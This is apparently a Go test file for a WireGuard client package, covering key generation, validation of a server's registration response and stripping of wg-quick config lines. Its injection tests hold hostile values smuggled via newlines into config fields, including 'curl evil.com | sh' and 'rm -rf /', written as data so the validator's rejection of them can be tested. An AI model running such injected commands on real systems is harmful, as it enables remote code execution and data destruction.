package remote

import (
	"crypto/rand"
	"encoding/base64"
	"strings"
	"testing"
)

func TestGenerateKeyPair(t *testing.T) {
	kp, err := GenerateKeyPair()
	if err != nil {
		t.Fatalf("GenerateKeyPair: %v", err)
	}

	// Verify base64 encoding
	privBytes, err := base64.StdEncoding.DecodeString(kp.PrivateKey)
	if err != nil {
		t.Fatalf("PrivateKey not valid base64: %v", err)
	}
	if len(privBytes) != 32 {
		t.Errorf("PrivateKey decoded length = %d, want 32", len(privBytes))
	}

	pubBytes, err := base64.StdEncoding.DecodeString(kp.PublicKey)
	if err != nil {
		t.Fatalf("PublicKey not valid base64: %v", err)
	}
	if len(pubBytes) != 32 {
		t.Errorf("PublicKey decoded length = %d, want 32", len(pubBytes))
	}

	// Verify key clamping
	if privBytes[0]&7 != 0 {
		t.Error("PrivateKey not clamped: low 3 bits of first byte should be 0")
	}
	if privBytes[31]&128 != 0 {
		t.Error("PrivateKey not clamped: high bit of last byte should be 0")
	}
	if privBytes[31]&64 == 0 {
		t.Error("PrivateKey not clamped: second-highest bit of last byte should be 1")
	}
}

func TestGenerateKeyPairUniqueness(t *testing.T) {
	kp1, err := GenerateKeyPair()
	if err != nil {
		t.Fatalf("first GenerateKeyPair: %v", err)
	}
	kp2, err := GenerateKeyPair()
	if err != nil {
		t.Fatalf("second GenerateKeyPair: %v", err)
	}
	if kp1.PrivateKey == kp2.PrivateKey {
		t.Error("two key pairs have same private key")
	}
	if kp1.PublicKey == kp2.PublicKey {
		t.Error("two key pairs have same public key")
	}
}

// validTestKey generates a valid base64-encoded 32-byte key for tests.
func validTestKey(t *testing.T) string {
	t.Helper()
	var key [32]byte
	if _, err := rand.Read(key[:]); err != nil {
		t.Fatal(err)
	}
	return base64.StdEncoding.EncodeToString(key[:])
}

func validResponse(t *testing.T) *RegisterResponse {
	t.Helper()
	return &RegisterResponse{
		AssignedIP:      "10.100.0.2/32",
		ServerPublicKey: validTestKey(t),
		ServerEndpoint:  "198.51.100.1:51820",
		ServerIP:        "10.100.0.1",
	}
}

func TestValidateWireGuardResponse_Valid(t *testing.T) {
	resp := validResponse(t)
	if err := validateWireGuardResponse(resp); err != nil {
		t.Fatalf("valid response rejected: %v", err)
	}
}

func TestValidateWireGuardResponse_ValidHostname(t *testing.T) {
	resp := validResponse(t)
	resp.ServerEndpoint = "vps.example.com:51820"
	if err := validateWireGuardResponse(resp); err != nil {
		t.Fatalf("valid hostname endpoint rejected: %v", err)
	}
}

func TestValidateWireGuardResponse_Injection(t *testing.T) {
	tests := []struct {
		name   string
		modify func(*RegisterResponse)
	}{
		{"newline in AssignedIP", func(r *RegisterResponse) {
			r.AssignedIP = "10.100.0.2/32\nPostUp = curl evil.com | sh"
		}},
		{"newline in ServerPublicKey", func(r *RegisterResponse) {
			r.ServerPublicKey = "abc\nPostUp = rm -rf /"
		}},
		{"newline in ServerEndpoint", func(r *RegisterResponse) {
			r.ServerEndpoint = "1.2.3.4:51820\nPostUp = whoami"
		}},
		{"newline in ServerIP", func(r *RegisterResponse) {
			r.ServerIP = "10.100.0.1\nPostUp = id"
		}},
		{"bracket injection", func(r *RegisterResponse) {
			r.ServerEndpoint = "[Peer]\nPublicKey = attacker"
		}},
		{"equals injection in IP", func(r *RegisterResponse) {
			r.ServerIP = "PostUp=evil"
		}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			resp := validResponse(t)
			tt.modify(resp)
			if err := validateWireGuardResponse(resp); err == nil {
				t.Error("expected injection attempt to be rejected")
			}
		})
	}
}

func TestValidateWireGuardResponse_BadFields(t *testing.T) {
	tests := []struct {
		name   string
		modify func(*RegisterResponse)
	}{
		{"empty AssignedIP", func(r *RegisterResponse) { r.AssignedIP = "" }},
		{"empty ServerPublicKey", func(r *RegisterResponse) { r.ServerPublicKey = "" }},
		{"empty ServerEndpoint", func(r *RegisterResponse) { r.ServerEndpoint = "" }},
		{"empty ServerIP", func(r *RegisterResponse) { r.ServerIP = "" }},
		{"IP outside subnet", func(r *RegisterResponse) { r.AssignedIP = "192.168.1.1/32" }},
		{"ServerIP outside subnet", func(r *RegisterResponse) { r.ServerIP = "192.168.1.1" }},
		{"non-/32 mask", func(r *RegisterResponse) { r.AssignedIP = "10.100.0.2/24" }},
		{"invalid CIDR", func(r *RegisterResponse) { r.AssignedIP = "not-an-ip" }},
		{"invalid ServerIP", func(r *RegisterResponse) { r.ServerIP = "not-an-ip" }},
		{"short key", func(r *RegisterResponse) { r.ServerPublicKey = "dG9vc2hvcnQ=" }},
		{"endpoint no port", func(r *RegisterResponse) { r.ServerEndpoint = "1.2.3.4" }},
		{"endpoint bad port", func(r *RegisterResponse) { r.ServerEndpoint = "1.2.3.4:99999" }},
		{"endpoint spaces in host", func(r *RegisterResponse) { r.ServerEndpoint = "my host:51820" }},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			resp := validResponse(t)
			tt.modify(resp)
			if err := validateWireGuardResponse(resp); err == nil {
				t.Error("expected invalid field to be rejected")
			}
		})
	}
}

func TestStripWGQuickConfig(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			"strips Address and DNS",
			"[Interface]\nAddress = 10.0.0.1/24\nDNS = 1.1.1.1\nPrivateKey = abc123\n\n[Peer]\nPublicKey = xyz789\nEndpoint = 1.2.3.4:51820",
			"[Interface]\nPrivateKey = abc123\n\n[Peer]\nPublicKey = xyz789\nEndpoint = 1.2.3.4:51820",
		},
		{
			"strips MTU and PostUp",
			"[Interface]\nMTU = 1420\nPostUp = iptables -A\nPrivateKey = abc\nPostDown = iptables -D",
			"[Interface]\nPrivateKey = abc",
		},
		{
			"strips SaveConfig",
			"[Interface]\nSaveConfig = true\nPrivateKey = abc",
			"[Interface]\nPrivateKey = abc",
		},
		{
			"preserves non-wg-quick lines",
			"[Interface]\nPrivateKey = abc123\nListenPort = 51820\n\n[Peer]\nPublicKey = xyz\nAllowedIPs = 10.0.0.0/24",
			"[Interface]\nPrivateKey = abc123\nListenPort = 51820\n\n[Peer]\nPublicKey = xyz\nAllowedIPs = 10.0.0.0/24",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := string(stripWGQuickConfig([]byte(tt.input)))
			if strings.TrimSpace(got) != strings.TrimSpace(tt.want) {
				t.Errorf("stripWGQuickConfig():\n got: %q\nwant: %q", got, tt.want)
			}
		})
	}
}
